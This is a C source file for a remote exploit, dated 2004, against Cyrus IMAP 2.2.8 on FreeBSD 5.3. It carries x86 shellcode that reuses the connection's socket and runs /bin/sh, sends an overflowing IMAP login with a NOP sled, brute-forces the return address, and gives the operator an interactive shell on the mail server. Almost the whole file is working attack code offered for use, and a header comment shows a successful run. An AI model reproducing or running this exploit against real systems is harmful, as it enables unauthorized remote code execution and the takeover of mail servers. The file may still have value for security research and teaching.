/*
 * freebsd-imapd-dtox.c by <cenobyte@binbash.org> 2004
 * Pre-auth remote exploit for: FreeBSD 5.3-RELEASE i386 Cyrus IMAP 2.2.8
 *
 * Exploits the imapmagicplus vulnerability in the cyrus-imapd-2.2.8.tbz FreeBSD
 * package. The vulnerability was discovered by Sebastian Krahmer:
 * http://www.securityfocus.com/bid/11738/
 *
 * $ ./freebsd-imapd-dtox 192.168.1.122 0xbfbfd104
 * FreeBSD 5.3-RELEASE i386 Cyrus IMAP 2.2.8 remote exploit by <cenobyte@binbash.org>
 * [-] Target: 192.168.1.122:143
 * [-] IMAP response: * OK freebsd Cyrus IMAP4 v2.2.8 server ready
 * [*] Bruteforcing using return address:
 * 0xbfbfd104
 * 0xbfbfd103
 * 0xbfbfd102
 * 0xbfbfd101
 * 0xbfbfd100
 * 0xbfbfd0ff
 * 0xbfbfd0fe
 * 0xbfbfd0fd
 * 0xbfbfd0fc
 * 0xbfbfd0fb
 * [-] Return adress: 0xbfbfd0fb worked!
 * [*] Connecting to shell:
 * uid=60(cyrus) gid=60(cyrus) groups=60(cyrus)
 */

#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define HEADER "FreeBSD 5.3-RELEASE i386 Cyrus IMAP 2.2.8 remote exploit by <cenobyte@binbash.org>"
#define CMD "/usr/bin/id\n"
#define IMAPHELO "Cyrus IMAP4 v2.2.8"
#define	IMAPPORT 143
#define BUFSIZE 1024

/* shellcode from Packet Storm
 */
char shellcode[] =
/* 53 bytes findsck */
    "\x83\xec\x10"         /* sub     $0x10, %esp            */
    "\x8b\xfc"             /* movl    %esp, %edi             */
    "\x6a\x10"             /* pushl   $0x10                  */
    "\x54"                 /* pushl   %esp                   */
    "\x57"                 /* pushl   %edi                   */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\xff"             /* movb    $0xff,%cl              */
    "\x51"                 /* pushl   %ecx                   */
    "\x33\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x1f"             /* movb    $0x1f,%al              */
    "\x51"                 /* pushl   %ecx                   */
    "\xcd\x80"             /* int     $0x80                  */
    "\x59"                 /* popl    %ecx                   */
    "\x59"                 /* popl    %ecx                   */
    "\x33\xdb"             /* xorl    %ebx,%ebx              */
    "\x3b\xc3"             /* cmpl    %ebx,%eax              */
    "\x75\x08"             /* jne     <findsckcode+39>       */
    "\xb7\x19"             /* movb    $0x19,%bh              */
    "\x66\x39\x5f\x02"     /* cmpw    %bx,0x2(%edi)          */
    "\x74\x02"             /* je      <findsckcode+39>       */
    "\xe2\xe6"             /* loop    <findsckcode+13>       */
/* dup2loop: */
    "\x8b\xd9"             /* movl    %ecx, %ebx             */
    "\xb1\x03"             /* movb    $0x03, %cl             */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x53"                 /* pushl   %ebx                   */
    "\xb0\x5a"             /* movb    $0x5a, %al             */
    "\xcd\x80"             /* int     $0x80                  */
    "\x40"                 /* incl    %eax                   */
    "\xe2\xf6"             /* loop    dup2loop               */
/* 23 bytes execv("/bin/sh", ...) */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x54"                 /* pushl   %esp                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x50"                 /* pushl   %eax                   */
    "\xb0\x3b"             /* movb    $0x3b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void
sendpacket(int socket, char *line)
{
	if (send(socket, line, strlen(line), 0) < 0) {
		printf("error: send()\n");
		exit(1);
	}
}

char*
recvpacket(int socket)
{
	int count;

	unsigned int timeout = 5;

	static char buffer[BUFSIZE];

	struct pollfd polls;
 
	polls.fd = socket;
	polls.events = POLLIN;

	if ((count = poll(&polls, 1, timeout * 1000)) <= 0)
		return(NULL);

	if ((count = recvfrom(socket, buffer, sizeof(buffer) - 1, 0, NULL, 0)) <= 0)
		return(NULL);

	buffer[count] = '\0';

	return(buffer);
}

int
shell(int sock)
{
	fd_set readfs;

	int count;

	char buffer[BUFSIZE];

	sendpacket(sock, CMD);
 
	while(1) {
		FD_ZERO(&readfs);
		FD_SET(0, &readfs);
		FD_SET(sock, &readfs);
	        
		if (select(sock + 1, &readfs, NULL, NULL, NULL) == -1) {
			printf("error: select() failed\n");
			exit(1);
		}

		if (FD_ISSET(0, &readfs)) {
			if ((count = read(0, buffer, BUFSIZE)) <= 0) {
				if (errno == EWOULDBLOCK || errno == EAGAIN)
					continue;

				exit(0);
			}

			write(sock, buffer, count);
		}
	
		if (FD_ISSET(sock, &readfs)) {
			if ((count = read(sock, buffer, BUFSIZE)) <= 0) {
				if (errno == EWOULDBLOCK || errno == EAGAIN)
					continue;

				exit(0);
			}
		
			write(1, buffer, count);
		}
	}

	return(0);	
}

int
main(int argc, char **argv)
{
	int s = 528;
	int sock;

	/* default base for bruteforcing */
	unsigned long ret = 0xbfbfdfff;

	char buf[s + 1];
	char ptr[BUFSIZE];
	char payload[BUFSIZE];

	struct sockaddr_in sin;
	struct hostent *he;

	printf("%s\n", HEADER);

	if (argc < 2) {
		printf("usage: %s <host> [base return adress for bruteforcing, e.g: 0xbfbfd110]\n", argv[0]);
		exit(1);
	}

	if ((he = gethostbyname(argv[1])) == NULL) {
		printf("error: hostname lookup failed!\n");
		exit(1);
	}

	if (argc == 3)
		ret = strtoul(argv[2], NULL, 16);

	sin.sin_family = PF_INET;
	sin.sin_port = htons(IMAPPORT);

	printf("[-] Target: %s:%d\n", argv[1], IMAPPORT);

	sock = socket(PF_INET, SOCK_STREAM, 0);
	bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);

	if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		printf("error: could not connect\n");
		exit(1);
	}

	snprintf(ptr, sizeof(ptr), "%s", recvpacket(sock));
	printf("[-] IMAP response: %s", ptr);	
	if (strstr(ptr, IMAPHELO) == NULL) {
		printf("error: target is not running %s\n", IMAPHELO);
		exit(1);
	}

	close(sock);

	printf("[*] Bruteforcing using return address:\n");

	/* this is a primitive bruteforcer, simple but effective
	 */
	while(ret > 0xbfbfafff) {
		printf("0x%lx\n", ret);
		
		sock = socket(PF_INET, SOCK_STREAM, 0);
		bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);

		memset(buf, 0x90, s);
		memcpy(buf + s / 2, shellcode, strlen(shellcode));
		memcpy(buf + s - 4, &ret, 4);

		snprintf(payload, sizeof(payload), ". login %s x", buf);
		if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
			printf("error: could not connect\n");
			exit(1);
		}

		write(sock, payload, strlen(payload));

		/* test if exploitation was succesful by running 'id'
		 */
		sendpacket(sock, CMD);

		snprintf(ptr, sizeof(ptr), "%s", recvpacket(sock));
		if (strstr(ptr, "uid=") != NULL) {
			printf("[-] Return adress: 0x%lx worked!\n",ret);
			printf("[*] Connecting to shell:\n");
			shell(sock);
		}

		ret-=1;

		close(sock);
	}

	return(0);
}
